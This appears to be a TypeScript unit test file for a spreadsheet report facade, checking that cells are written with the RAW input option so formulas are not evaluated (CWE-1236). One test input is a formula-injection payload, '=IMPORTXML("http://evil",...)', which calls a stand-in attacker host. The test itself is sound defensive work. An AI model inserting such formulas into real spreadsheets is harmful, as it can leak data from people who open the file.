import { SpreadsheetReportFacade } from '../../../src/infrastructure/facades/SpreadsheetReportFacade';

class FakeSpreadsheetService {
  createResult: {
    spreadsheetId: string;
    sheets?: Array<{ properties: { sheetId: number; title: string; index: number } }>;
  } = {
    spreadsheetId: 'ss1',
    sheets: [{ properties: { sheetId: 0, title: 'Sheet1', index: 0 } }]
  };
  updateRangesCalls: Array<{
    spreadsheetId: string;
    updates: unknown;
    options?: { valueInputOption?: string };
  }> = [];
  createSpreadsheet(): typeof this.createResult {
    return this.createResult;
  }
  updateRanges(
    spreadsheetId: string,
    updates: unknown,
    options?: { valueInputOption?: string }
  ): void {
    this.updateRangesCalls.push({ spreadsheetId, updates, options });
  }
}

describe('SpreadsheetReportFacade', () => {
  test('creaReport writes cells with valueInputOption RAW to prevent formula injection (CWE-1236)', () => {
    const spreadsheets = new FakeSpreadsheetService();
    const facade = new SpreadsheetReportFacade(spreadsheets as never);

    facade.creaReport('report', 'folder1', [['col1', '=IMPORTXML("http://evil","//a")']]);

    expect(spreadsheets.updateRangesCalls).toEqual([
      {
        spreadsheetId: 'ss1',
        updates: { range: "'Sheet1'!A1", values: [['col1', '=IMPORTXML("http://evil","//a")']] },
        options: { valueInputOption: 'RAW' }
      }
    ]);
  });

  test('creaReport skips updateRanges entirely for empty rows', () => {
    const spreadsheets = new FakeSpreadsheetService();
    const facade = new SpreadsheetReportFacade(spreadsheets as never);

    facade.creaReport('report', 'folder1', []);

    expect(spreadsheets.updateRangesCalls).toEqual([]);
  });
});
